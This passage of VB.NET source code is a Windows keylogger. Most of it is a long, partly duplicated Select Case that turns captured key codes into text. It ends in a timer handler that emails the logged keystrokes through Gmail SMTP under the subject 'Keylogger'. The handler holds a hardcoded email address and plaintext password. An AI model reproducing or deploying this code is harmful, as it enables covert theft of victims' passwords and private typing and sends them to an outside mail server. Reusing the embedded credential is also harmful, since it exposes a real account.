                    Case 113
                        RichTextBox1.Text += "[F2]"
                    Case 114
                        RichTextBox1.Text += "[F3]"
                    Case 115
                        RichTextBox1.Text += "[F4]"
                    Case 116
                        RichTextBox1.Text += "[F5]"
                    Case 117
                        RichTextBox1.Text += "[F6]"
                    Case 118
                        RichTextBox1.Text += "[F7]"
                    Case 119
                        RichTextBox1.Text += "[F8]"
                    Case 120
                        RichTextBox1.Text += "[F9]"
                    Case 121
                        RichTextBox1.Text += "[F10]"
                    Case 122
                        RichTextBox1.Text += "[F11]"
                    Case 123
                        RichTextBox1.Text += "[F12]"
                    Case 160
                        RichTextBox1.Text += ""
                    Case 161
                        RichTextBox1.Text += ""
                    Case 164
                        RichTextBox1.Text += ""
                    Case 165
                        RichTextBox1.Text += "[Alt]"
                    Case 189
                        RichTextBox1.Text += "-"
                    Case 187
                        RichTextBox1.Text += "+"
                    Case 46
                        RichTextBox1.Text += "[Delete]"
                    Case 14
                        RichTextBox1.Text += "[ACHTUNG 14]"
                    Case 15
                        RichTextBox1.Text += "[ACHTUNG 15]"
                    Case 16
                        RichTextBox1.Text += ""
                    Case 17
                        RichTextBox1.Text += "[Ctrl]"
                    Case 18
                        RichTextBox1.Text += "[Alt]"
                    Case 19
                        RichTextBox1.Text += "[Pause-Break]"
                    Case 20
                        RichTextBox1.Text += "[Caps Lock]"
                    Case 21
                        RichTextBox1.Text += "[ACHTUNG 21]"
                    Case 22
                        RichTextBox1.Text += "[ACHTUNG 22]"
                    Case 23
                        RichTextBox1.Text += "[ACHTUNG 23]"
                    Case 24
                        RichTextBox1.Text += "[ACHTUNG 24]"
                    Case 25
                        RichTextBox1.Text += "[ACHTUNG 25]"
                    Case 26
                        RichTextBox1.Text += "[ACHTUNG 26]"
                    Case 27
                        RichTextBox1.Text += "[Esc]"
                    Case 28
                        RichTextBox1.Text += "[ACHTUNG 28]"
                    Case 29
                        RichTextBox1.Text += "[ACHTUNG 29]"
                    Case 30
                        RichTextBox1.Text += "[ACHTUNG 30]"
                    Case 31
                        RichTextBox1.Text += "[ACHTUNG 31]"
                    Case 32
                        RichTextBox1.Text += " "
                    Case 33
                        RichTextBox1.Text += "[PageUp]"
                    Case 34
                        RichTextBox1.Text += "[PageDown]"
                    Case 35
                        RichTextBox1.Text += "[End]"
                    Case 36
                        RichTextBox1.Text += "[Home]"
                    Case 37
                        RichTextBox1.Text += "[Left]"
                    Case 38
                        RichTextBox1.Text += "[Up]"
                    Case 39
                        RichTextBox1.Text += "[Right]"
                    Case 40
                        RichTextBox1.Text += "[Down]"
                    Case 41
                        RichTextBox1.Text += ")"
                    Case 42
                        RichTextBox1.Text += "*"
                    Case 43
                        RichTextBox1.Text += "+"
                    Case 44
                        RichTextBox1.Text += "[SS]"
                    Case 45
                        RichTextBox1.Text += "[INS]"

                    Case 47
                        RichTextBox1.Text += "/"
                    Case 48
                        RichTextBox1.Text += "0"
                    Case 49
                        RichTextBox1.Text += "1"
                    Case 50
                        RichTextBox1.Text += "2"
                    Case 51
                        RichTextBox1.Text += "3"
                    Case 52
                        RichTextBox1.Text += "4"
                    Case 53
                        RichTextBox1.Text += "5"
                    Case 54
                        RichTextBox1.Text += "6"
                    Case 55
                        RichTextBox1.Text += "7"
                    Case 56
                        RichTextBox1.Text += "8"
                    Case 57
                        RichTextBox1.Text += "9"
                    Case 58
                        RichTextBox1.Text += ":"
                    Case 59
                        RichTextBox1.Text += ";"
                    Case 60
                        RichTextBox1.Text += "<"
                    Case 61
                        RichTextBox1.Text += "="
                    Case 62
                        RichTextBox1.Text += ">"
                    Case 63
                        RichTextBox1.Text += "?"
                    Case 64
                        RichTextBox1.Text += "@"
                    Case 65
                        RichTextBox1.Text += "A"
                    Case 66
                        RichTextBox1.Text += "B"
                    Case 67
                        RichTextBox1.Text += "C"
                    Case 68
                        RichTextBox1.Text += "D"
                    Case 69
                        RichTextBox1.Text += "E"
                    Case 70
                        RichTextBox1.Text += "F"
                    Case 71
                        RichTextBox1.Text += "G"
                    Case 72
                        RichTextBox1.Text += "H"
                    Case 73
                        RichTextBox1.Text += "I"
                    Case 74
                        RichTextBox1.Text += "J"
                    Case 75
                        RichTextBox1.Text += "K"
                    Case 76
                        RichTextBox1.Text += "L"
                    Case 77
                        RichTextBox1.Text += "M"
                    Case 78
                        RichTextBox1.Text += "N"
                    Case 79
                        RichTextBox1.Text += "O"
                    Case 80
                        RichTextBox1.Text += "P"
                    Case 81
                        RichTextBox1.Text += "Q"
                    Case 82
                        RichTextBox1.Text += "R"
                    Case 83
                        RichTextBox1.Text += "S"
                    Case 84
                        RichTextBox1.Text += "T"
                    Case 85
                        RichTextBox1.Text += "U"
                    Case 86
                        RichTextBox1.Text += "V"
                    Case 87
                        RichTextBox1.Text += "W"
                    Case 88
                        RichTextBox1.Text += "X"
                    Case 89
                        RichTextBox1.Text += "Y"
                    Case 90
                        RichTextBox1.Text += "Z"
                    Case 91
                        RichTextBox1.Text += "[Win]"
                    Case 92
                        RichTextBox1.Text += "[Win]"
                    Case 93
                        RichTextBox1.Text += "[STT]"
                    Case 94
                        RichTextBox1.Text += "^"
                    Case 95
                        RichTextBox1.Text += "_"
                    Case 96
                        RichTextBox1.Text += "[num0]"
                    Case 97
                        RichTextBox1.Text += "[num1]"
                    Case 98
                        RichTextBox1.Text += "[num2]"
                    Case 99
                        RichTextBox1.Text += "[num3]"
                    Case 100
                        RichTextBox1.Text += "[num4]"
                    Case 101
                        RichTextBox1.Text += "[num5]"
                    Case 102
                        RichTextBox1.Text += "[num6]"
                    Case 103
                        RichTextBox1.Text += "[num7]"
                    Case 104
                        RichTextBox1.Text += "[num8]"
                    Case 105
                        RichTextBox1.Text += "[num9]"
                    Case 106
                        RichTextBox1.Text += "*"
                    Case 107
                        RichTextBox1.Text += "+"
                    Case 108
                        RichTextBox1.Text += "l"
                    Case 109
                        RichTextBox1.Text += "-"
                    Case 110
                        RichTextBox1.Text += ","
                    Case 111
                        RichTextBox1.Text += "/"
                    Case 112
                        RichTextBox1.Text += "p" 'bura
                    Case 113
                        RichTextBox1.Text += "q"
                    Case 114
                        RichTextBox1.Text += "r"
                    Case 115
                        RichTextBox1.Text += "s"
                    Case 116
                        RichTextBox1.Text += "t"
                    Case 117
                        RichTextBox1.Text += "u"
                    Case 118
                        RichTextBox1.Text += "v"
                    Case 119
                        RichTextBox1.Text += "w"
                    Case 120
                        RichTextBox1.Text += "x"
                    Case 121
                        RichTextBox1.Text += "y"
                    Case 122
                        RichTextBox1.Text += "z"
                    Case 123
                        RichTextBox1.Text += "{"
                    Case 124
                        RichTextBox1.Text += "|"
                    Case 125
                        RichTextBox1.Text += "}"
                    Case 126
                        RichTextBox1.Text += "~"
                    Case 127
                        RichTextBox1.Text += "[ACHTUNG 127]"
                    Case 128
                        RichTextBox1.Text += "€"
                    Case 129
                        RichTextBox1.Text += "[ACHTUNG 129]"
                    Case 130
                        RichTextBox1.Text += "‚"
                    Case 131
                        RichTextBox1.Text += "ƒ"
                    Case 132
                        RichTextBox1.Text += "„"
                    Case 133
                        RichTextBox1.Text += "…"
                    Case 134
                        RichTextBox1.Text += "†"
                    Case 135
                        RichTextBox1.Text += "‡"
                    Case 136
                        RichTextBox1.Text += "ˆ"
                    Case 137
                        RichTextBox1.Text += "[ACHTUNG 137]"
                    Case 138
                        RichTextBox1.Text += "Š"
                    Case 139
                        RichTextBox1.Text += "‹"
                    Case 140
                        RichTextBox1.Text += "[ACHTUNG 140]"
                    Case 141
                        RichTextBox1.Text += "[ACHTUNG 141]"
                    Case 142
                        RichTextBox1.Text += "Z"
                    Case 143
                        RichTextBox1.Text += "[ACHTUNG 143]"
                    Case 144
                        RichTextBox1.Text += "[Num-Lock]"
                    Case 145
                        RichTextBox1.Text += "[Scroll-Lock]"
                    Case 146
                        RichTextBox1.Text += "’"
                    Case 147
                        RichTextBox1.Text += """"
                    Case 148
                        RichTextBox1.Text += """"
                    Case 149
                        RichTextBox1.Text += "•"
                    Case 150
                        RichTextBox1.Text += "–"
                    Case 151
                        RichTextBox1.Text += "—"
                    Case 152
                        RichTextBox1.Text += "˜"
                    Case 153
                        RichTextBox1.Text += "™"
                    Case 154
                        RichTextBox1.Text += "š"
                    Case 155
                        RichTextBox1.Text += "›"
                    Case 156
                        RichTextBox1.Text += "[ACHTUNG 155]"
                    Case 157
                        RichTextBox1.Text += "[ACHTUNG 157]"
                    Case 158
                        RichTextBox1.Text += "z"
                    Case 159
                        RichTextBox1.Text += "Ÿ"
                    Case 160
                        RichTextBox1.Text += "[ACHTUNG 160]"
                    Case 161
                        RichTextBox1.Text += "¡"
                    Case 162
                        RichTextBox1.Text += ""
                    Case 163
                        RichTextBox1.Text += ""
                    Case 164
                        RichTextBox1.Text += "¤"
                    Case 166
                        RichTextBox1.Text += "¦"
                    Case 167
                        RichTextBox1.Text += "§"
                    Case 168
                        RichTextBox1.Text += "¨"
                    Case 169
                        RichTextBox1.Text += "©"
                    Case 170
                        RichTextBox1.Text += "ª"
                    Case 171
                        RichTextBox1.Text += "«"
                    Case 172
                        RichTextBox1.Text += "¬"
                    Case 173
                        RichTextBox1.Text += "[ACHTUNG 173]"
                    Case 174
                        RichTextBox1.Text += "®"
                    Case 175
                        RichTextBox1.Text += "¯"
                    Case 176
                        RichTextBox1.Text += "°"
                    Case 177
                        RichTextBox1.Text += "±"
                    Case 178
                        RichTextBox1.Text += "²"
                    Case 179
                        RichTextBox1.Text += "³"
                    Case 180
                        RichTextBox1.Text += "´"
                    Case 181
                        RichTextBox1.Text += "µ"
                    Case 182
                        RichTextBox1.Text += "[ACHTUNG 182]"
                    Case 183
                        RichTextBox1.Text += ""
                    Case 184
                        RichTextBox1.Text += ""
                    Case 185
                        RichTextBox1.Text += "¹"
                    Case 186
                        RichTextBox1.Text += "Ş"
                    Case 187
                        RichTextBox1.Text += "»"
                    Case 188
                        RichTextBox1.Text += ","
                    Case 189
                        RichTextBox1.Text += ":"
                    Case 190
                        RichTextBox1.Text += "."
                    Case 191
                        RichTextBox1.Text += "Ö"
                    Case 192
                        RichTextBox1.Text += """"
                    Case 193
                        RichTextBox1.Text += "Á"
                    Case 194
                        RichTextBox1.Text += "Â"
                    Case 195
                        RichTextBox1.Text += "Ã"
                    Case 196
                        RichTextBox1.Text += "Ä"
                    Case 197
                        RichTextBox1.Text += "Æ"
                    Case 198
                        RichTextBox1.Text += "Ç"
                    Case 199
                        RichTextBox1.Text += "È"
                    Case 200
                        RichTextBox1.Text += "É"
                    Case 201
                        RichTextBox1.Text += "Ê"
                    Case 202
                        RichTextBox1.Text += "Ë"
                    Case 203
                        RichTextBox1.Text += "Ì"
                    Case 204
                        RichTextBox1.Text += "Í"
                    Case 205
                        RichTextBox1.Text += "Í"
                    Case 206
                        RichTextBox1.Text += "Î"
                    Case 207
                        RichTextBox1.Text += "Ï"
                    Case 208
                        RichTextBox1.Text += "Ğ"
                    Case 209
                        RichTextBox1.Text += "Ñ"
                    Case 210
                        RichTextBox1.Text += "Ò"
                    Case 211
                        RichTextBox1.Text += "Ó"
                    Case 212
                        RichTextBox1.Text += "Ô"
                    Case 213
                        RichTextBox1.Text += "Õ"
                    Case 214
                        RichTextBox1.Text += "Ö"
                    Case 215
                        RichTextBox1.Text += "×"
                    Case 216
                        RichTextBox1.Text += "Ø"
                    Case 217
                        RichTextBox1.Text += "Ù"
                    Case 218
                        RichTextBox1.Text += "Ú"
                    Case 219
                        RichTextBox1.Text += "Ğ"
                    Case 220
                        RichTextBox1.Text += "Ç"
                    Case 221
                        RichTextBox1.Text += "Ü"
                    Case 222
                        RichTextBox1.Text += "İ"
                    Case 223
                        RichTextBox1.Text += "*"
                    Case 224
                        RichTextBox1.Text += "à"
                    Case 225
                        RichTextBox1.Text += "á"
                    Case 226
                        RichTextBox1.Text += "â"
                    Case 227
                        RichTextBox1.Text += "<"
                    Case 228
                        RichTextBox1.Text += "ä"
                    Case 229
                        RichTextBox1.Text += "æ"
                    Case 230
                        RichTextBox1.Text += "ç"
                    Case 231
                        RichTextBox1.Text += "è"
                    Case 232
                        RichTextBox1.Text += "é"
                    Case 233
                        RichTextBox1.Text += "ê"
                    Case 234
                        RichTextBox1.Text += "ë"
                    Case 235
                        RichTextBox1.Text += "ì"
                    Case 236
                        RichTextBox1.Text += "í"
                    Case 237
                        RichTextBox1.Text += "í"
                    Case 238
                        RichTextBox1.Text += "î"
                    Case 239
                        RichTextBox1.Text += "ï"
                    Case 240
                        RichTextBox1.Text += "Ğ"
                    Case 241
                        RichTextBox1.Text += "ñ"
                    Case 242
                        RichTextBox1.Text += "ò"
                    Case 243
                        RichTextBox1.Text += "ó"
                    Case 244
                        RichTextBox1.Text += "ô"
                    Case 245
                        RichTextBox1.Text += "õ"
                    Case 246
                        RichTextBox1.Text += "ö"
                    Case 247
                        RichTextBox1.Text += "÷"
                    Case 248
                        RichTextBox1.Text += "ø"
                    Case 249
                        RichTextBox1.Text += "ù"
                    Case 250
                        RichTextBox1.Text += "ú"
                    Case 251
                        RichTextBox1.Text += "û"
                    Case 252
                        RichTextBox1.Text += "ü"
                    Case 253
                        RichTextBox1.Text += "I"
                    Case 254
                        RichTextBox1.Text += "Ş"
                    Case 255
                        RichTextBox1.Text += "ÿ"
                    Case Else
                        RichTextBox1.Text += Chr(logger).ToString
                End Select
            End If

        Next


    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        Dim mail As New MailMessage()
        Dim SmtpServer As New SmtpClient
        SmtpServer.Credentials = New Net.NetworkCredential("furkanfbr@gmail.com", "8989323846q")
        SmtpServer.Port = 587
        SmtpServer.Host = "smtp.gmail.com"
        SmtpServer.EnableSsl = True
        SmtpServer.EnableSsl = True
        mail.To.Add("furkanfbr@gmail.com")
        mail.From = New MailAddress("furkanfbr@gmail.com")
        mail.Subject = "Keylogger"
        mail.Body = RichTextBox1.Text
        SmtpServer.Send(mail)
        RichTextBox1.Text = Nothing
    End Sub


    Private Sub RichTextBox1_TextChanged(sender As Object, e As EventArgs) Handles RichTextBox1.TextChanged

    End Sub
End Class
